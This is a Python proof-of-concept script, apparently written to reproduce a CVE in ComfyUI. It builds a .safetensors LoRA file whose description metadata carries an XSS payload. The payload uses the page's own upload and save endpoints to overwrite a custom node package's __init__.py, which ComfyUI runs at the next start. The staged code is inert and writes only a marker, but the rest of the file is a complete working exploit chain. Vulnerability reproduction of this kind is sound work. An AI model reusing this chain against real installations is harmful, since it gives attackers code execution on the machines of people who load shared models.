#!/usr/bin/env python3
"""Build the attacker's carrier and the inert staged initializer.

Attacker capability (this is ALL of it): two .safetensors files in models/loras/.
Writer is the official `safetensors.torch.save_file`, so the payload lives in the
header's `__metadata__` map -- the part of the format whose whole selling point is
that it cannot execute code.

The staged initializer is what the chain drops onto a custom node package. It is
deliberately inert: it writes one marker file and registers no node. Everything
else in the chain is the product's own code doing its own job.

Usage:
    python make_poc.py --outdir artifacts --marker-path <abs path for the marker>
"""
import argparse
import base64
import hashlib
import json
import pathlib

import torch
from safetensors.torch import save_file

TAG = "custom_scripts_modelspec"
STAGE_TOKEN = "LCS-STAGED-CANARY " + TAG

# ---------------------------------------------------------------------------
# The description strings. `modelspec.description` is the single attacker-
# controlled field; the strings below are the entire payload.
# ---------------------------------------------------------------------------

BENIGN = "A perfectly ordinary LoRA description with no markup."

# The staged target: any installed custom node package's initializer. The name is
# a stand-in for whatever the victim actually has installed (ComfyUI-Manager,
# a face-detailer pack, a controlnet aux pack, ...).
VICTIM_PACK = "Victim-Demo-Pack"

# The injected script. Three constraints, each one paid for by a real failure:
#   * no double quote anywhere -> would terminate the HTML attribute early
#   * no template literal (backtick) as an OBJECT-LITERAL KEY -> V8 rejects
#     ``{`method`:'POST'}`` with SyntaxError "Unexpected template string". The first
#     build of this payload did exactly that, and the browser then reported
#     `img.onerror === null`, which is observationally identical to "the product
#     blocked the XSS". Diagnosed by compiling the attribute with `new Function()`
#     inside the page and again with `node --check`.
#   * the string that carries the payload is never delimited with a character it
#     also contains, so a later payload edit cannot close it early (the earlier run
#     in this corpus lost a finding to exactly that).
# Everything here therefore uses single quotes; the HTML attribute uses double quotes.


def js_stage(b64: str, setter: str, tag: str) -> str:
    """Same-origin staging, performed BY THE PAGE, not by the driver."""
    return (
        "const s=atob('" + b64 + "');"
        "const f=new FormData();"
        "f.append('image',new File([s],'staged_init.py'));"
        "f.append('type','temp');"
        "f.append('subfolder','');"
        "f.append('overwrite','true');"
        "fetch('/upload/image',{method:'POST',body:f})"
        ".then(r=>r.json())"
        ".then(j=>fetch('/pysssss/save/'+encodeURIComponent("
        "'custom_nodes/" + VICTIM_PACK + "/__init__.py'),"
        "{method:'POST',headers:{'content-type':'application/json'},"
        "body:JSON.stringify({type:'temp',subfolder:'',filename:j.name})}))"
        ".then(r=>{" + setter + "='" + tag + "'+r.status})"
        ".catch(e=>{" + setter + "='" + tag + "ERR-'+e});"
    )


def staged_initializer(marker_path: str) -> str:
    """The replacement __init__.py. Inert: one marker write, then normal shape."""
    return (
        "# Replacement initializer for " + VICTIM_PACK + ".\n"
        "# Delivered by the chain: safetensors __metadata__ -> innerHTML -> same-origin\n"
        "# write to custom_nodes/. Imported and executed by ComfyUI at the next start.\n"
        "# Inert payload: it records that it ran, and nothing else.\n"
        "import json as _json, os as _os, pathlib as _pathlib, time as _time\n"
        "\n"
        "MARKER = _pathlib.Path(" + repr(marker_path) + ")\n"
        "MARKER.parent.mkdir(parents=True, exist_ok=True)\n"
        "MARKER.write_text(_json.dumps({\n"
        "    'token': '" + STAGE_TOKEN + "',\n"
        "    'pid': _os.getpid(),\n"
        "    'ppid': _os.getppid(),\n"
        "    'time': _time.strftime('%Y-%m-%dT%H:%M:%SZ', _time.gmtime()),\n"
        "    'cwd': _os.getcwd(),\n"
        "    'argv': _os.sys.executable,\n"
        "}, indent=2) + '\\n')\n"
        "\n"
        "NODE_CLASS_MAPPINGS = {}\n"
        "NODE_DISPLAY_NAME_MAPPINGS = {}\n"
    )


def description_payload(staged_source: str) -> str:
    b64 = base64.b64encode(staged_source.encode()).decode()
    import html as _html
    # Vector A: an inline event handler. Compiles only if the fragment was parsed
    #           by a scripting-enabled document.
    a = '<img src=x onerror="' + js_stage(b64, "window.__mbe2e", "A:") + '">'
    # Vector B: an <iframe srcdoc>. Its content is parsed later, by the iframe's OWN
    #           browsing context, which is scripting-enabled and same-origin with the
    #           parent -- so it also works if the parent fragment was parsed inertly.
    inner = "<script>" + js_stage(b64, "window.parent.__mbe2e2", "B:") + "</script>"
    b = '<iframe style="display:none" srcdoc="' + _html.escape(inner, quote=True) + '"></iframe>'
    return a + b


def write_safetensors(path: pathlib.Path, description: str) -> None:
    """Same shape as the validated carrier in this corpus: one 1x1 f32 tensor,
    the interesting part entirely in __metadata__."""
    tensors = {"lora_unet_down_blocks_0.alpha": torch.zeros(1, dtype=torch.float32)}
    meta = {
        "modelspec.sai_model_spec": "1.0.0",
        "modelspec.architecture": "stable-diffusion-v1/lora",
        "modelspec.implementation": "https://github.com/Stability-AI/generative-models",
        "modelspec.title": "demonstration LoRA",
        "modelspec.description": description,
        "ss_output_name": "demo",
        "ss_sd_model_name": "v1-5-pruned.safetensors",
        "ss_clip_skip": "2",
    }
    save_file(tensors, str(path), metadata=meta)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--outdir", default=str(pathlib.Path.home() / "cve_repro_modelspec/artifacts"))
    ap.add_argument("--marker-path",
                    default=str(pathlib.Path.home() / "cve_repro_modelspec/run/staged_marker.json"),
                    help="absolute path the staged initializer will write when imported")
    a = ap.parse_args()

    out = pathlib.Path(a.outdir)
    out.mkdir(parents=True, exist_ok=True)

    staged = staged_initializer(a.marker_path)
    (out / "staged_init.py").write_text(staged, encoding="utf-8")

    payload = description_payload(staged)
    write_safetensors(out / "evil_cs.safetensors", payload)
    write_safetensors(out / "benign_cs.safetensors", BENIGN)

    # The payload as the browser will receive it, for the record.
    (out / "payload_description.txt").write_text(payload, encoding="utf-8")

    lines = []
    for f in sorted(out.iterdir()):
        if f.is_file() and f.name != "SHA256SUMS.txt":
            lines.append(f"{hashlib.sha256(f.read_bytes()).hexdigest()}  {f.name}")
    (out / "SHA256SUMS.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")

    print("\n".join(lines))
    print("\nstaged initializer will write marker:", a.marker_path)
    print("payload length:", len(payload), "bytes")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
